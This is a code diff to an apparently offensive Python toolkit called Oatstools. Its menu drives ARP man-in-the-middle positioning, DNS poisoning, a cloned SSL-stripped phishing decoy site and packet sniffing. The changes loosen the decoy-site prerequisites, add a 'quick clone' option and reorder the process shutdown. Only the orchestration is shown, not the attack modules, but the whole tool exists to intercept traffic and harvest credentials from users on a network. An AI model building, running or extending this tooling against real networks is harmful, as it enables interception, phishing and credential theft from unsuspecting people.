@@ -22,8 +22,8 @@ BANNER = """
 CATEGORIES = """
 \033[1m\033[95mOFFENSIVE SCRIPTS\033[0m
 [\033[97mC\033[0m]ustom MitM ARP - Construct a MitM between two network devices
-[\033[97mD\033[0m]NSpoisoner - Begin DNS poisoning on target, use after MitM ARP for better prio
-[\033[97mS\033[0m]pawn http decoy site - Use after you have DNS poisoned, clone a website and local host for fish
+[\033[97mS\033[0m]pawn http decoy site - Clone a website by url and deploy an SSL-stripped http server
+[\033[97mD\033[0m]NSpoisoner - Begin DNS poisoning on target, example spoofing domain to your decoy site
 [\033[97mP\033[0m]acketSniffer - Use on the interface where the MitM is positioned
 
 
@@ -111,8 +111,8 @@ def main():
 
       elif userchoice.strip().lower() == "d":
         if not mitm_arp_process or not mitm_arp_process.is_alive():
-          print("Non running mitm_arp process found. Do you wish to continue? (Y)"
-                "Or wish to go back and start a mitm? (N)")
+          print("None running mitm_arp process found. Do you wish to continue? (Y)"
+                "Or wish to go back and start a mitm for spoof priority? (N)")
           start_dns_poison = input("")
           if not start_dns_poison.strip().lower() == "y":
             print("Going back...")
@@ -126,24 +126,20 @@ def main():
         dns_poison_process.start()
 
       elif userchoice.strip().lower() == "s":
-        if not mitm_arp_process or not mitm_arp_process.is_alive():
-          print("Non running mitm_arp process found. Go back and start a mitm...")
-          time.sleep(2)
-          continue
-
-        if not dns_poison_process or not dns_poison_process.is_alive():
-          print("No DNS poison detected. Go back and start DNS poisoning...")
-          time.sleep(2)
-          continue
 
         if decoy_server_process and decoy_server_process.is_alive():
           print("Stopping previous decoy server...")
           decoy_server_process.terminate()
           decoy_server_process.join()
 
+
+        quick_clone = input("Do you want to make a quick clone? (Increased risk of IP block on domain) (YES/NO)\n" )
+        if quick_clone.strip().lower() != "yes":
+          quick_clone = "no"
+        ## Will not make a try for correct url here since want to able cloning from custom sources (local domains etc)
         decoy_url = input("Input the URL you want to clone as a decoy:\n")
         port = 80
-        decoy_server_process = multiprocessing.Process(target=spawn_decoy_site.main, name="decoy_server_process", args=(decoy_url, port,))
+        decoy_server_process = multiprocessing.Process(target=spawn_decoy_site.main, name="decoy_server_process", args=(decoy_url, port, quick_clone,))
         decoy_server_process.start()
 
       elif userchoice.strip().lower() == "p":
@@ -181,9 +177,6 @@ def main():
           mitm_arp.restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac)  # Original spoofed_mac_here
           mitm_arp.restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac, attacker_mac)  # Original victim_mac_here
 
-        if dns_poison_process and dns_poison_process.is_alive():
-          terminate_running_process(dns_poison_process)
-
         if decoy_server_process and decoy_server_process.is_alive():
           # Graceful termination of servers
           if spawn_decoy_site.https_server:
@@ -194,23 +187,33 @@ def main():
             spawn_decoy_site.http_server.server_close()  # Close the HTTPS server's socket
           terminate_running_process(decoy_server_process)
 
+        if dns_poison_process and dns_poison_process.is_alive():
+          terminate_running_process(dns_poison_process)
+
         if sniffing_process and sniffing_process.is_alive():
           terminate_running_process(sniffing_process)
 
         return
 
-  ## Correctuly terminating spawned subprocesses on KeyboardInterrupt and returning to Oatstools
+  ## Correctly terminating spawned subprocesses on KeyboardInterrupt and returning to Oatstools
   except KeyboardInterrupt:
     if mitm_arp_process and mitm_arp_process.is_alive():
       terminate_running_process(mitm_arp_process)
       mitm_arp.restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac)  # Original spoofed_mac_here
       mitm_arp.restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac, attacker_mac)  # Original victim_mac_here
 
+    if decoy_server_process and decoy_server_process.is_alive():
+      # Graceful termination of servers
+      if spawn_decoy_site.https_server:
+        spawn_decoy_site.https_server.shutdown()  # Stop the HTTPS server
+        spawn_decoy_site.https_server.server_close()  # Close the HTTPS server's socket
+      if spawn_decoy_site.http_server:
+        spawn_decoy_site.http_server.shutdown()  # Stop the HTTPS server
+        spawn_decoy_site.http_server.server_close()  # Close the HTTPS server's socket
+      terminate_running_process(decoy_server_process)
+
     if dns_poison_process and dns_poison_process.is_alive():
       terminate_running_process(dns_poison_process)
-
-    if decoy_server_process and decoy_server_process.is_alive():
-      terminate_running_process(decoy_server_process)
 
     if sniffing_process and sniffing_process.is_alive():
       terminate_running_process(sniffing_process)
